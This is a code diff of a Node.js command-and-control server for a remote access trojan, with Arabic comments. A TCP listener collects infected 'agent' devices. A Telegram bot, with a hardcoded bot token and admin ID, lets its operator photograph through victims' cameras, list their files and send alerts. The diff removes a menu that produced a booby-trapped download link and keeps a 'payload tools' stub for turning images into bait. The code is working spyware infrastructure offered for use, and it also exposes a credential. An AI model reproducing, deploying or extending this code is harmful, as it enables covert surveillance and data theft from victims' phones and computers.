@@ -1,12 +1,10 @@
 const { Telegraf, Markup } = require('telegraf');
 const net = require('net');
-const fs = require('fs');
 
-// --- إعدادات السيادة والمزامنة (التوكن والآيدي مدمجين) ---
+// --- إعدادات السيادة والمزامنة ---
 const TOKEN = "7579044776:AAHmovdlHgnuife-wnFrmJqU_q1_OFQz97I";
 const ADMIN_ID = 6654753506; 
 const PORT = 10000;
-const HOST_URL = "your-app-name.onrender.com"; // تأكد من وضع رابط تطبيقك هنا
 
 let activeAgents = {}; 
 const bot = new Telegraf(TOKEN);
@@ -21,25 +19,30 @@ const server = net.createServer((socket) => {
             const agentId = info.hostname || `Device_${Math.floor(Math.random()*1000)}`;
             activeAgents[agentId] = { socket, info };
 
-            // إشعار الجلسة الجديدة
+            // إشعار الجلسة الجديدة (صيغة بسيطة لعدم حدوث خطأ)
             bot.telegram.sendMessage(ADMIN_ID, 
-                `✅ **جلسة جديدة نشطة!**\n\n` +
+                `✅ **اتصال جديد نشط!**\n\n` +
                 `📱 الجهاز: ${info.hostname}\n` +
-                `🔋 البطارية: ${info.battery}%\n` +
                 `🖥️ النظام: ${info.platform}\n` +
-                `🔌 الشحن: ${info.charging ? 'متصل' : 'غير متصل'}`, { parse_mode: 'Markdown' });
-        } catch (e) { console.log("Error Parsing Data"); }
+                `🔋 البطارية: ${info.battery}%`, { parse_mode: 'Markdown' });
+        } catch (e) { 
+            console.log("Initial Connection without JSON info");
+        }
     });
 
     socket.on('error', () => {});
     socket.on('close', () => {});
 });
-server.listen(PORT, '0.0.0.0');
 
-// --- 2. القائمة الرئيسية ---
+// تشغيل السيرفر على المنفذ المطلوب
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server listening on port ${PORT}`);
+});
+
+// --- 2. لوحة التحكم (Commands) ---
 bot.start((ctx) => {
     if (ctx.from.id !== ADMIN_ID) return;
-    ctx.reply('🛡️ مركز العمليات جاهز. التحكم متاح لك فقط:', 
+    ctx.reply('🛡️ مختبر التحكم جاهز للعمل:', 
         Markup.inlineKeyboard([
             [Markup.button.callback('📱 الأجهزة المتصلة', 'list_agents')],
             [Markup.button.callback('🛠️ أدوات التلغيم', 'payload_tools')]
@@ -47,43 +50,28 @@ bot.start((ctx) => {
     );
 });
 
-// --- 3. معالج أدوات التلغيم (Payload Tools) ---
-bot.action('payload_tools', (ctx) => {
-    ctx.answerCbQuery();
-    ctx.reply('🛠️ **قائمة التلغيم:**\nاختر نوع العملية المطلوبة:', 
-        Markup.inlineKeyboard([
-            [Markup.button.callback('🖼️ تلغيم صورة', 'bind_img')],
-            [Markup.button.callback('🔗 إنشاء رابط ملغم', 'bind_link')]
-        ])
-    );
-});
-
-bot.action('bind_link', (ctx) => {
-    ctx.answerCbQuery();
-    ctx.reply(`🔗 الرابط الملغم الخاص بك:\nhttps://${HOST_URL}/download\n\nبمجرد فتح الضحية للرابط، ستظهر الجلسة هنا.`);
-});
-
-// --- 4. إدارة الجلسات والتحكم ---
 bot.action('list_agents', (ctx) => {
-    ctx.answerCbQuery();
     const ids = Object.keys(activeAgents);
-    if (ids.length === 0) return ctx.reply("❌ لا توجد جلسات مفتوحة حالياً.");
+    if (ids.length === 0) return ctx.reply("❌ لا توجد أجهزة متصلة حالياً.");
     
-    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id} (${activeAgents[id].info.battery}%)`, `manage_${id}`)]);
+    let buttons = ids.map(id => [Markup.button.callback(`🎮 تحكم: ${id}`, `manage_${id}`)]);
     ctx.reply("🌐 الجلسات النشطة:", Markup.inlineKeyboard(buttons));
+});
+
+bot.action('payload_tools', (ctx) => {
+    ctx.reply('🛠️ **أدوات التلغيم:**\nأرسل صورة أو ملف لتحويله إلى طعم ملغم (قيد التطوير في هذا الإصدار).');
 });
 
 bot.action(/^manage_/, (ctx) => {
     const id = ctx.match.input.split('_')[1];
-    ctx.reply(`🎮 التحكم في الضحية ${id}:`, 
+    ctx.reply(`🎮 التحكم في ${id}:`, 
         Markup.inlineKeyboard([
             [Markup.button.callback('📸 تصوير', `cmd_${id}_cam`), Markup.button.callback('📳 اهتزاز', `cmd_${id}_vibrate`)],
-            [Markup.button.callback('📂 ملفات', `cmd_${id}_ls`), Markup.button.callback('🔔 إشعار', `cmd_${id}_alert`)]
+            [Markup.button.callback('🔔 إشعار', `cmd_${id}_alert`), Markup.button.callback('📂 ملفات', `cmd_${id}_ls`)]
         ])
     );
 });
 
-// إرسال الأوامر الفعلية
 bot.action(/^cmd_/, (ctx) => {
     const parts = ctx.match.input.split('_');
     const id = parts[1];
@@ -97,5 +85,8 @@ bot.action(/^cmd_/, (ctx) => {
     }
 });
 
-bot.launch();
-console.log("System Online with Admin ID: " + ADMIN_ID);
+bot.catch((err) => {
+    console.error('Telegraf error', err);
+});
+
+bot.launch().then(() => console.log("Bot Live!"));
